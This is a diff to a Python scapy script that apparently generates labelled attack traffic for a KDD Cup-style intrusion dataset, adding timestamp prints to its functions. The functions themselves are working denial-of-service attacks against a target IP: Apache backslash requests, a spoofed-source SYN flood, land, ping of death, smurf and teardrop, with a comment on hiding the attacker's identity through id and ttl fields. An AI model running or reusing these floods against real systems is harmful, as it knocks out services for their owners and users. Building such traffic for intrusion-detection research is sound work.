@@ -3,12 +3,14 @@
 # As the KDD Cup does NOT use TTL, I will use that to "label" Test PCAPs
 # This will increase by increments of 10....
 from scapy.all import *
+from datetime import datetime
 
 
 # Denial of service attack against apache web server where a client
 # requests a URL containing many backslashes
 # Can just try the HTTP LIB to use this for us?
 def back(target_ip, payload, src_ip="192.168.147.150", target_port=80):
+    print("Executing back at: " + str(datetime.now()))
     # Given a URL, attempt to go into root? If failed at attempt 1, don't try anymore?
     i = IP(src=src_ip, dst=target_ip)
     t = TCP(flags="S", dport=int(target_port), sport=RandShort(), timeout=2)
@@ -21,6 +23,7 @@ def back(target_ip, payload, src_ip="192.168.147.150", target_port=80):
 # SYN flood denial of service on one or more ports - Neptune
 # You can use the id and ttl fields to help hide the identity of the attacker
 def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=1000):
+    print("Executing SYN Flood at: " + str(datetime.now()))
     count = 0
     while count < packets_send:
         # Creates the packet and assigns it to variable a
@@ -38,6 +41,7 @@ def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=100
 # Denial of service where a remote host is sent a UDP packet with the
 # same source and destination
 def land(target_ip, target_port, packets_send=1000):
+    print("Executing land at: " + str(datetime.now()))
     count = 0
     while count < packets_send:
         i = IP(src=target_ip, dst=target_ip)
@@ -51,17 +55,20 @@ def land(target_ip, target_port, packets_send=1000):
 # Send a malicious ping to another computer that exceeds that maximum IPv4
 # packet size which is 65,535 bytes
 def pod(target_ip, src_ip="192.168.147.152"):
+    print("Executing pod at: " + str(datetime.now()))
     i = IP(src=src_ip, dst=target_ip)
-    send(fragment(i/ICMP()/(str('X' * 60000))))
+    f = fragment(i/ICMP()/(str('X' * 60000)))
+    send(f, verbose=False)
 
 
 # Denial of service icmp echo reply flood
 def smurf(source_ip, target_ip, packets_send=10000):
+    print("Executing smurf at: " + str(datetime.now()))
     count = 0
     while count < packets_send:
         send(IP(src=source_ip, dst=target_ip, ttl=50) / ICMP(), verbose=False)
         count = count + 1
-    print("Land attack complete!")
+    print("Smurf attack complete!")
 
 
 # Denial of service where mis-fragmented UDP packets cause some
@@ -76,6 +83,8 @@ def teardrop(target, attack, src_ip="192.168.147.153"):
     print("   2: large payload (1300 bytes), 12 packets, offset=80x8 bytes")
     print("   3: large payload (1300 bytes), 2 packets, offset=3x8 bytes")
     print("   4: large payload (1300 bytes), 2 packets, offset=10x8 bytes")
+    print("Executing teardrop at: " + str(datetime.now()))
+
     if attack == '0':
         print("Using attack 0")
         size = 36
